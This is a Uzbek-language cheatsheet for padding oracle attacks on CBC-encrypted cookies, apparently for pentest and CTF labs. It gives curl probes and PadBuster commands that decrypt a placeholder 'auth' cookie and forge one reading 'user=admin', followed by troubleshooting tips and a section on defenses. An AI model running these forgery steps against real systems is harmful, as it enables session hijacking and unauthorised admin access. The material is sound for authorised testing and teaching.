# Padding Oracle Attack — Cheatsheet

> Faqat **ruxsat berilgan** pentest/CTF/lab muhitlarida (masalan HackMyVM, TryHackMe, o'z lab serveringiz) ishlatish uchun.

---

## 1. Nazariy asos

**Padding Oracle** — server shifrlangan ma'lumotni deshifrlab, padding (PKCS#7) to'g'ri yoki noto'g'ri ekanligini bilvosita bildiradigan (status kod, xato matni, javob vaqti orqali) tizim.

Bu farqdan foydalanib hujumchi:
- Shifrlash **kalitini bilmasdan** ochiq matnni tiklaydi (decrypt)
- Yoki o'zi xohlagan ochiq matn uchun **yangi to'g'ri shifrmatn** yaratadi (encrypt / forgery)

**Zaif bo'lgan rejim:** CBC (Cipher Block Chaining)
**Xavfsiz alternativalar:** AES-GCM, Encrypt-then-MAC

Mashhur real hujumlar: **POODLE**, **Lucky13**, ba'zi JWT/ASP.NET ViewState implementatsiyalari.

---

## 2. Oracle'ni qo'lda aniqlash (PadBuster'dan oldin)

Hujumdan oldin, server rostdan ham oracle ekanligini tasdiqlash kerak:

```bash
# To'g'ri cookie bilan so'rov
curl -i -H "Cookie: auth=QU0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n" http://target/home/index.php

# Bitta baytni buzib (masalan охирги belgini o'zgartirib) qayta yuborish
curl -i -H "Cookie: auth=XX0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n" http://target/home/index.php
```

Ikkala javobni solishtiring:
- Status kod farqi (200 vs 500)?
- Javob matni/uzunligi farqi?
- Javob vaqti (timing) farqi?

Agar farq bo'lsa — bu **oracle** va PadBuster ishlatilishi mumkin.

---

## 3. PadBuster — asosiy sintaksis

```bash
padbuster <URL> <EncryptedSample> <BlockSize> [OPTIONS]
```

| Argument | Ma'nosi |
|---|---|
| `URL` | Oracle vazifasini bajaradigan aniq endpoint |
| `EncryptedSample` | Tahlil qilinadigan shifrlangan qiymat (Base64) |
| `BlockSize` | Blok o'lchami baytlarda: DES/3DES = `8`, AES = `16` |

### Decrypt (o'qib ko'rish) rejimi

```bash
padbuster http://target/home/index.php QU0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n 8 \
  --cookies 'auth=QU0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n'
```

### Forgery (yangi shifrmatn yaratish) rejimi

```bash
padbuster http://target/home/index.php QU0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n 8 \
  --cookies 'auth=QU0vQkq1+ls2YFhWjQOIKXkvmKDYT1+n' \
  -plaintext 'user=admin'
```

---

## 4. Muhim flaglar

| Flag | Vazifasi |
|---|---|
| `--cookies '<name>=<value>'` | So'rovga qo'shiladigan HTTP Cookie header |
| `-plaintext '<text>'` | Encrypt/forgery rejimini yoqadi, berilgan matn uchun shifrmatn yasaydi |
| `-encoding <0-4>` | Base64 kodlash turi (`0`=standart, `3`=URL-safe kabi) |
| `-error "<matn>"` | Padding xatosini aniqlash uchun qidiriladigan matn (avtomatik aniqlanmasa qo'lda beriladi) |
| `-noiv` | Agar shifrmatn tarkibida IV (Initialization Vector) bo'lmasa |
| `-noencode` | Natijani Base64 encode qilmasdan chiqarish |
| `-verbose` | Batafsil log |
| `-post 'param=value'` | POST parametrlarini yuborish (GET o'rniga) |
| `-headers 'Header: value'` | Qo'shimcha HTTP header yuborish |
| `-interactive` | Har bir noaniq javobda qo'lda tasdiqlash so'raydi |

---

## 5. Tipik ish oqimi (workflow)

```
1. Oracle mavjudligini qo'lda tasdiqlash (curl orqali javoblarni solishtirish)
        ↓
2. Decrypt rejimida sinov: oracle to'g'ri ishlayotganini tekshirish
   padbuster <URL> <sample> <blocksize> --cookies '...'
        ↓
3. Agar avtomatik aniqlanmasa: -error flagi bilan xato matnini ko'rsatish
        ↓
4. Muvaffaqiyatli decrypt bo'lsa → forgery: -plaintext bilan yangi token yasash
        ↓
5. Yasalgan tokenni original cookie o'rniga qo'yib serverga yuborish
```

---

## 6. Natijani talqin qilish

PadBuster muvaffaqiyatli ishlagach quyidagilarni chiqaradi:

```
[+] Decrypted value (ASCII): user=guest;role=basic

[+] Encrypted value is: XyZ9AbCdEf...
```

- **Decrypt rejimida** — asl ochiq matn ko'rinadi
- **Forgery rejimida** — yangi, server tomonidan haqiqiy deb qabul qilinadigan shifrlangan qiymat beriladi

Bu qiymatni original cookie o'rniga almashtiring:

```bash
curl -i -H "Cookie: auth=XyZ9AbCdEf..." http://target/home/index.php
```

---

## 7. Muammolarni bartaraf etish

| Muammo | Yechim |
|---|---|
| "No difference between padding error and valid padding" | `-error` flagini qo'lda ko'rsating, yoki `-verbose` bilan javoblarni tekshiring |
| Block size noto'g'ri | `4`, `8`, `16` variantlarini sinab ko'ring |
| Encoding xatosi | `-encoding` qiymatini o'zgartiring (URL-safe Base64 uchun `3` yoki `4`) |
| IV topilmadi / uzunlik noto'g'ri | `-noiv` flagini qo'shib ko'ring |
| Redirect/404 xatolari | To'g'ri, cookie'ni haqiqatan deshifrlaydigan endpoint ekanligini qayta tekshiring |

---

## 8. Himoyalanish (Defense) — pentest hisobotiga qo'shish uchun

- Authenticated encryption ishlatish: **AES-GCM**, **ChaCha20-Poly1305**
- **Encrypt-then-MAC** yondashuvi
- Padding xatolarini boshqa xatolardan **ajratib bo'lmaydigan** qilib qaytarish (bir xil status kod, bir xil xabar, bir xil javob vaqti)
- Constant-time solishtirish funksiyalaridan foydalanish
- Session tokenlarni server tomonida saqlash (stateless shifrlangan cookie o'rniga)

---

## 9. Havolalar

- PadBuster GitHub: https://github.com/AonCyberLabs/PadBuster
- OWASP — Padding Oracle: https://owasp.org/www-community/attacks/Padding_Oracle_Attack
- POODLE haqida: https://www.openssl.org/~bodo/ssl-poodle.pdf
